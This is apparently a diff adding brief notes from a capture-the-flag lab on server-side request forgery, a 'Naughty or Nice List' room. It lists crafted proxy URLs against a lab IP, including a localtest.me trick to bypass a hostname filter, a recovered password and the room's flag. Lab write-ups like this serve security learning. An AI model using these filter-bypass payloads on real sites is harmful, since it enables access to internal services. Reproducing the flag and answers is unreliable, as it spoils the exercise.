@@ -1,0 +1,25 @@
+The Naughty or Nice List - Special by Tib3rius (SSRF)
+
+10.10.39.70
+
+http://10.10.39.70/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3Dtimmy
+http://10.10.39.70/?proxy=http://list.hohoho:8080/search.php?name=timmy
+
+http://10.10.39.70/?proxy=http://list.hohoho:8080/save.php?name=timmy
+http://10.10.39.70/?proxy=http%3A%2F%2Flist%2Ehohoho%3A8080%2Fsave%2Ephp%3Fname%3Dtimmy
+
+http://10.10.39.70/?proxy=http://localtest.me
+http://10.10.39.70/?proxy=http%3A%2F%2Flocaltest%2Eme
+
+
+http://10.10.39.70/?proxy=http://list.hohoho.localtest.me
+http://10.10.39.70/?proxy=http%3A%2F%2Flist%2Ehohoho%2Elocaltest%2Eme
+
+
+Santa,
+If you need to make any changes to the Naughty or Nice list, you need to login.
+I know you have trouble remembering your password so here it is: Be good for goodness sake!
+- Elf McSkidy
+
+
+THM{EVERYONE_GETS_PRESENTS}
